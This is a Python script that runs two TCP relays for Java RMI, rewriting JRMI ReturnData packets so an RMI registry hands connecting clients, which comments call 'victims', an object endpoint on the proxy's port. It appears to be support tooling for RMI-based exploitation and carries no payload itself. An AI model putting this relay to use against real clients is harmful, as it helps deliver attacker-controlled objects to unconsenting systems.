#!/usr/bin/env python3
import argparse
import socket
import select
import threading
import time

class CProxy(object):
    def start(self):
        self.running = True
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', self.listen_port))
        s.listen(1)
        while self.running:
            # get a connection from a victim
            print(f'[{self.style}] Waiting for connection')
            self.client, addr = s.accept()
            print(f'[{self.style}] Received connection from {addr}')
            # connect to the real RMI server
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.connect(('localhost', self.connect_port))
            # add the socket descriptors to a list so we can select them
            self.descriptors.append(self.client.fileno())
            self.descriptors.append(self.server.fileno())

            # handle packets from the victim and the real RMI server
            while True:
                # check for data that we can read
                rd, wr, ex = select.select(self.descriptors, [], [])
                for descriptor in ex:
                    self.client.close()
                    self.server.close()
                    break

                closed = False
                for descriptor in rd:
                    if descriptor is self.client.fileno():
                        data = self.client.recv(1024)
                        if data != b'':
                            self.server.send(data)
                        else:
                            closed = True
                    elif descriptor is self.server.fileno():
                        # receive data from the RMI server
                        data = self.server.recv(1024)
                        if data != b'':
                            # RMI server proxy will rewrite JRMI ReturnData messages to point to our reachable proxy
                            # Obj server proxy will just perform a no op
                            data = self.process(data)
                            self.client.send(data)
                        else:
                            closed = True
                if closed:
                    print(f'[{self.style}] Connection closed\n')
                    self.client.close()
                    self.server.close()
                    self.descriptors = []
                    break

    def process(self, data):
        return data

# -------------------------------------------------------------------------------------------------

class CProxyRMI(CProxy):
    def __init__(self, args):
        self.listen_port = args.rmifrontend
        self.connect_port = args.rmibackend
        self.obj_proxy = args.objfrontend
        self.hostname = args.host.encode('utf8')
        self.style = 'RMI'
        self.descriptors = []

    def process(self, data):
        if data.startswith(b'\x51\xac\xed'):
            if self.hostname in data:
                port_offset = data.find(self.hostname) + len(self.hostname) + 2
                modified = data[:port_offset] + int(self.obj_proxy).to_bytes(length=2, byteorder='big') + data[port_offset + 2:]
                return modified
        return data

# -------------------------------------------------------------------------------------------------

class CProxyObj(CProxy):
    def __init__(self, args):
        self.listen_port = args.objfrontend
        self.connect_port = args.object
        self.hostname = args.host.encode('utf8')
        self.style = 'Obj'
        self.descriptors = []

# -------------------------------------------------------------------------------------------------

def kickoff(o):
    o.start()

# -------------------------------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("object", type=int, help="port to forward object requests to")
    parser.add_argument("--rmibackend", type=int, default=1234, help="port to forward RMI lookups to")
    parser.add_argument("--rmifrontend", type=int, default=9200, help="RMI server port to listen on")
    parser.add_argument("--objfrontend", type=int, default=6380, help="Object server port to listen on")
    parser.add_argument("--host", default="127.0.0.1", help="Hostname the RMI server is listening on")
    args = parser.parse_args()

    # start the RMI and Object server proxies
    proxies = []
    proxies.append(CProxyRMI(args))
    proxies.append(CProxyObj(args))

    threads = []
    for proxy in proxies:
        t = threading.Thread(target=kickoff, args=(proxy,))
        threads.append(t)
        t.daemon = True
        t.start()

    # monitor the threads
    while len(threads) > 0:
        for t in threads:
            if t.is_alive() == False:
                threads.remove(t)
        time.sleep(1)

if __name__ == '__main__':
    main()
